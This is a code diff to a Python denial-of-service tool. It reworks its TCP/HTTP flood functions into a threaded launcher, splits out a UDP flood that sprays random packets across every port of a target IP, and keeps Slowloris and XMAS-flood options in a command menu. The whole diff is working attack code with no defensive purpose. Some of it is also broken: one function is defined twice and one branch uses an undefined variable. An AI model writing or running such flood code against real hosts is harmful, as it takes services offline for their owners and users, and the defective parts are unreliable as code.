@@ -7,6 +7,7 @@ from scapy.all import *
 from getpass import getpass as hinput
 from time import time, sleep
 init(autoreset=True)
+init(autoreset=True)
 
 os.system('cls')
 
@@ -196,25 +197,56 @@ def scan_ip(ip):
     print(f'Scanning IP: {ip}')
     scan_ports(ip)
 
-def start_custom_attack(ip, port, packets_per_second, threads):
+def start(ip, port, pack, threads):
+    print("Starting attack with threads:", threads)  # เพิ่มบรรทัดนี้
     global useragents, ref, acceptall
     hh = random._urandom(3016)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
     reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
-    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    content = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-    main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
+    main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((str(ip),int(port)))
+            s.connect((str(ip), int(port)))
             s.send(str.encode(main_req))
-            for i in range(packets_per_second):
+            for i in range(pack):
                 s.send(str.encode(main_req))
-            xx += random.randint(0, int(packets_per_second))
+            xx += random.randint(0, int(pack))
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+        except:
+            s.close()
+            print('[+] Server Down.')
+
+def start2(ip, port, pack, threads):
+    for x in range(threads):
+        thred = threading.Thread(target=start, args=(ip, port, pack))
+        thred.start()
+
+def start(ip, port, pack):
+    print("Starting attack with threads:")
+    global useragents, ref, acceptall
+    hh = random._urandom(3016)
+    xx = int(0)
+    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
+    accept = random.choice(acceptall)
+    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
+    content = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+    main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip), int(port)))
+            s.send(str.encode(main_req))
+            for i in range(pack):
+                s.send(str.encode(main_req))
+            xx += random.randint(0, int(pack))
             print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
@@ -280,22 +312,21 @@ def xmasflood_attack(ip, port, num_requests):
                             seq=RandShort(),
                             ack=RandShort(),
                             sport=RandShort()))
+def upd_attack(ip, port):
+    print("Starting UDP Flood attack on", ip, "at port", port, "...")
+    sent = 0
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    while True:
+        sock.sendto(bytes, (ip, port))
+        sent = sent + 1
+        port = port + 1
+        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
+        if port == 65534:
+            port = 1
 
-
-def ddos_attack(ip, port, attack_choice, num_requests=0, packets_per_second=0, threads=0):
-    if attack_choice == 1:
-        print("Starting UDP Flood attack on", ip, "at port", port, "...")
-        sent = 0
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1490)
-        while True:
-            sock.sendto(bytes, (ip, port))
-            sent = sent + 1
-            port = port + 1
-            print("Sent %s packet to %s through port:%s" % (sent, ip, port))
-            if port == 65534:
-                port = 1
-    elif attack_choice == 2:
+def ddos_attack(ip, port, attack_choice, num_requests):
+    if attack_choice == 2:
         print("Starting HTTP flood attack on", ip, "at port", port, "...")
         headers = "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000))
         headers += "Host: {}\r\n".format(ip)
@@ -321,8 +352,7 @@ def ddos_attack(ip, port, attack_choice, num_requests=0, packets_per_second=0, t
             dos.shutdown(socket.SHUT_RDWR)
             dos.close()
     elif attack_choice == 3:
-        print("Starting TCP Flood attack on", ip, "at port", port, "at Packets Per Second", packets_per_second, "and Threads", threads, "...")
-        start_custom_attack(ip, port, packets_per_second, threads)
+        print("Starting TCP Flood attack on", ip, "at port", port, "at Packets Per Second", pack, "and Threads", "...")
     elif attack_choice == 4:
         print("Starting Slowloris attack on", ip, "at port", port, "Count", num_requests, "...")
         slowloris_attack(ip, port, num_requests)
@@ -377,20 +407,20 @@ def main():
                 print("-8 [IP] [PORT] [BYTES] [THREADS]: Layer 4 DDoS Attack is a type of Distributed Denial of Service (DDoS) attack that focuses on the Layer 4 of the network structure. It involves flooding the target with a high volume of data without considering the content of the data, causing the target machine to become unable to provide its services. This attack often utilizes TCP/UDP connections or sends UDP packets from multiple sources simultaneously to maximize its effectiveness. It typically has severe impacts on the network services of the target.")
             elif input_text.startswith('DDos '):
                 parts = input_text.split()
-                if len(parts) < 4:
+                if len(parts) < 3:
                     print("Invalid syntax. Usage: Type 'DDos' to see choice commands.")
                 else:
                     _, choice, ip, port, *params = parts
                     choice = int(choice)
                     if choice == 1:
-                        ddos_attack(ip, int(port), choice)
+                        upd_attack(ip, int(port))
                     elif choice == 2:
                         num_requests = int(params[0]) if params else 0
                         ddos_attack(ip, int(port), choice, num_requests)
                     elif choice == 3:
-                        packets_per_second = int(params[0]) if params else 0
+                        pack = int(params[0]) if params else 0
                         threads = int(params[1]) if len(params) > 1 else 0
-                        ddos_attack(ip, int(port), choice, packets_per_second, threads)
+                        start2(ip, int(port), pack, threads)
                     elif choice == 4:
                         num_requests = int(params[0]) if params else 0
                         ddos_attack(ip, int(port), choice, num_requests)
